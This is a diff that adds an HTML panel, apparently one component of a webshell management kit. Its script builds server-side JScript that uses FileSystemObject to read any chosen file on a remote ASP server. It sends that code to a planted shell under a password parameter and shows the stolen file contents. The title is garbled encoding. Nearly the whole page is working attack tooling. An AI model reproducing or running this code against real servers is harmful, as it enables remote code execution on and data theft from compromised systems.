@@ -1,0 +1,42 @@
+   <HTML >
+   <HEAD>
+   <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=gb2312" />
+   <TITLE>±à¼Ô´´úÂë</TITLE>
+   <link rel="stylesheet" type="text/css" href="css.css">
+   </HEAD>
+   <BODY scroll="no" TOPMARGIN="0"  LEFTMARGIN="0" MARGINHEIGHT="0" MARGINWIDTH="0">
+
+   Input Path: <input style="WIDTH:90%" type="text" name="path" value="g:\asp\2004.asp" />
+
+   <form name="codeform" method="post" action="" target=_blank>
+   <textarea name="code"></textarea>
+   </form>
+
+   <script>
+   function RUNonclick(){
+   with(document.codeform){
+   code.value=js.value+"wjj('"+path.value.replace(/\\/g,'\\\\')+"');\r\nResponse.write(xie+'<\/textarea>');";
+   code.name=parent.PW.value;
+   action=parent.url.value;
+   submit();
+   }
+   }
+   </script>
+
+   <textarea style="display:none;"  name="js">
+   var fso = new ActiveXObject("Scripting.FileSystemObject");
+   var a=/<\//g;
+   a.compile("<\/","g");
+
+   function wjj(f){
+   var _r=fso.OpenTextFile(f,1);
+   xie+=_r.ReadAll().replace(a, "&amp;lt\/");
+   _r.close();
+   }
+
+   var xie="<textarea style='HEIGHT:90%;WIDTH:100%'>";
+   //wjj("g:\\asp\\2004.asp");
+   //Response.write(xie+'<\/textarea>');
+   </textarea>
+
+   </BODY></HTML>
